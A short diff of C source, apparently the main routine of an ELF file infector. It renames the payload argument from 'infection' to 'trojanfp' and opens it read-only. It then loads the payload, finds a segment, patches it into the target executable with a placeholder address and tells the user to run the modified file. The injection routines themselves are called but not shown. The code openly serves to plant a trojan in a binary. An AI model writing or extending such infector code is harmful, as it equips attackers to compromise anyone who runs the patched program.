@@ -21,7 +21,7 @@ extern elf_info_t   _program[];
 int main(int argc, char **argv)
 {
     if (argc < 3) {
-        log_info("Use %s <elf file> <infection>\n", argv[0]);
+        log_info("Use %s <elf file> <trojanfp>\n", argv[0]);
         asm_exit(0);
     }
 
@@ -29,8 +29,8 @@ int main(int argc, char **argv)
     const char *file = argv[1];
     FILE *fp = file_open_rw(file, &m1);
     assert(fp);
-    FILE *infection = file_open_rw(argv[2], &m2);
-    assert(infection);
+    FILE *trojanfp = file_open_ro(argv[2], &m2);
+    assert(trojanfp);
 
     if(!elf_validate_filetype(fp)) {
         log_error("Not a valid ELF file");
@@ -39,7 +39,7 @@ int main(int argc, char **argv)
 
     elf_t *elfo = elf_parse_file(file, fp, m1);
 
-    infect_t *inf = inf_load(elfo, infection);
+    infect_t *inf = inf_load(elfo, trojanfp);
     if (inf_scan_segment(inf)) {
         if (inf_load_and_patch(inf, m1, (long)0x1122334455667788) == true)
             printf("Done!\nTry running %s\n", file);
